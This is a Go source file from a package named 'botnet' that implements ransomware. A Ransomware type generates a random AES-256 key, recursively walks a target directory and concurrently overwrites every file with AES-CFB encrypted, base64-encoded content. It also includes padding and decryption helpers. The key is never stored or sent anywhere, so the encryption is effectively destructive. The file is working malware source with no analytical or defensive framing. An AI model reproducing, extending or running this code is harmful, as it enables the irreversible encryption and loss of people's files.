package botnet

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

//Ransomware is
type Ransomware struct {
	Dir string
	Key []byte
	wg  *sync.WaitGroup
}

//Payload is
type Payload struct {
	file os.FileInfo
	path string
}

//NewRansomware is
func NewRansomware(dir string) (*Ransomware, error) {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}

	return &Ransomware{
		Dir: dir,
		wg:  new(sync.WaitGroup),
		Key: key,
	}, nil
}

//Exec is
func (r *Ransomware) Exec() error {
	// open dir
	dir, err := ioutil.ReadDir(r.Dir)
	if err != nil {
		return err
	}
	r.crawl(dir, r.Dir)
	r.wg.Wait()
	return nil
}

var ind int

func (r *Ransomware) encrypt(f os.FileInfo, path string) {
	defer r.wg.Done()
	filePath := filepath.Join(path, f.Name())
	content := new(bytes.Buffer)
	fl, err := os.Open(filePath)
	if err != nil {
		fmt.Println(err)
		return
	}
	if _, err := io.Copy(content, fl); err != nil {
		fmt.Println(err)
		return
	}

	block, err := aes.NewCipher(r.Key)
	if err != nil {
		fmt.Println(err)
		return
	}

	msg := Pad(content.Bytes())
	ciphertext := make([]byte, aes.BlockSize+len(msg))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println(err)
		return
	}

	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(ciphertext[aes.BlockSize:], []byte(msg))
	finalMsg := removeBase64Padding(base64.URLEncoding.EncodeToString(ciphertext))
	if err := ioutil.WriteFile(filePath, []byte(finalMsg), 0644); err != nil {
		fmt.Println(err)
		return
	}
}

func (r *Ransomware) crawl(dir []os.FileInfo, path string) {
	for _, f := range dir {
		fp := filepath.Join(path, f.Name())
		if f.IsDir() {
			d, err := ioutil.ReadDir(fp)
			if err != nil {
				log.Panic(err)
				continue
			}
			r.crawl(d, fp)
			continue
		}
		r.wg.Add(1)
		go r.encrypt(f, path)
	}
}

func addBase64Padding(value string) string {
	m := len(value) % 4
	if m != 0 {
		value += strings.Repeat("=", 4-m)
	}

	return value
}

func removeBase64Padding(value string) string {
	return strings.Replace(value, "=", "", -1)
}

// Pad is
func Pad(src []byte) []byte {
	padding := aes.BlockSize - len(src)%aes.BlockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(src, padtext...)
}

// Unpad is
func Unpad(src []byte) ([]byte, error) {
	length := len(src)
	unpadding := int(src[length-1])

	if unpadding > length {
		return nil, errors.New("unpad error. This could happen when incorrect encryption key is used")
	}

	return src[:(length - unpadding)], nil
}

func decrypt(key []byte, text string) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	decodedMsg, err := base64.URLEncoding.DecodeString(addBase64Padding(text))
	if err != nil {
		return "", err
	}

	if (len(decodedMsg) % aes.BlockSize) != 0 {
		return "", errors.New("blocksize must be multipe of decoded message length")
	}

	iv := decodedMsg[:aes.BlockSize]
	msg := decodedMsg[aes.BlockSize:]

	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(msg, msg)

	unpadMsg, err := Unpad(msg)
	if err != nil {
		return "", err
	}

	return string(unpadMsg), nil
}
